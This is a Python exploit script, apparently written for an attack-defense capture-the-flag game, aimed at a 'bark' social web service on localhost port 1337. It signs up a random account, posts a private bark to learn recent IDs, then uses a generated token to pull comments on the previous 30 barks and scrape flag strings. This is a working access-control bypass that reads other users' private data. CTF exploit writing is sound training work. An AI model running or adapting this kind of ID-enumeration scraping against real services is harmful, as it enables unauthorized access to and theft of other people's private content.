#!/usr/bin/env python3

import sys
import requests
import hashlib
import re
from random import choice


alph_full = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
alph_caps = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
names = ['goliath', 'royal', 'dacota', 'marry', 'hunter', 'twilight' ,'smile' ,'castle', 'lucky', 'Wilson', 'Johanna', 'Willow', 'Wigfrid', 'Wendy', 'Wolfgang', 'Wes', 'Webber', 'Woody']
FlagRegExp = re.compile(r'[A-Za-z0-9]{31}=')

#ip = sys.argv[1]
ip = '127.0.0.1'
port = '1337'
host = f'{ip}:{port}'


def id_gen( size = 10, first = names, next = alph_full ) -> str:
	beg = choice(first)
	return  beg + ''.join(choice(next) for i in range(size - len(beg)))


def main():

	flags = ''

	u_name = id_gen(next=alph_caps)
	passwd = id_gen(first=alph_full)
		
	sess, csrf = register( u_name, passwd )
	new_bark_id = add_bark( sess, csrf, u_name )

	token = get_token( sess )

	lim = int( new_bark_id )
	for b_id in range( lim - 30, lim ):

		for flag in view_comments( sess, b_id, token ):
			flags += flag + '\n'

	print( flags, flush=True )


def get_token( s ) -> str:
		#http://127.0.0.1:1337/generate_token/ | GET
		html = s.get( f'http://{host}/generate_token/' ).text
		return re.findall( r"<h5>(\w{32})</h5>", html )[0]


def get_csrf( html:str ) -> str:
	return re.findall( 'name="csrfmiddlewaretoken" value="(\w+)"', html )[0]


def register( u_name:str, passwd:str ):
	#name="csrfmiddlewaretoken" value="gV...7"
	#http://127.0.0.1:1337/signup/ | POST | csrfmiddlewaretoken=8...D&username=1&password=1&fname=&lname=
	s = requests.session()
	html = s.get(f'http://{host}/signup/').text
	html = s.post(f'http://{host}/signup/', data={
		'csrfmiddlewaretoken':get_csrf( html ), 
		'username':u_name, 
		'password':passwd, 
		'fname':'', 
		'lname':''
	}).text
	return s, get_csrf( html )


def add_bark( s, csrf:str, u_name:str ) -> str:
	#http://127.0.0.1:1337/add_bark/ | POST | csrfmiddlewaretoken=Z...s&bark_text=1&is_private=on
	html = s.post( f'http://{host}/add_bark/', data={
		'csrfmiddlewaretoken':csrf, 
		'bark_text':u_name,
		'is_private':'on'
	} ).text
	return re.findall(f'"/get_bark/(\d+)/">{u_name}<', html)[0]


def view_comments( s, b_id, token:str ) -> list:
	#http://127.0.0.1:1337/users/<int:page_n>/	
	html = s.get( f'http://{host}/api/comments/{b_id}/', headers={"Token":token} ).text
	return FlagRegExp.findall( html )


if __name__ == '__main__':
	main()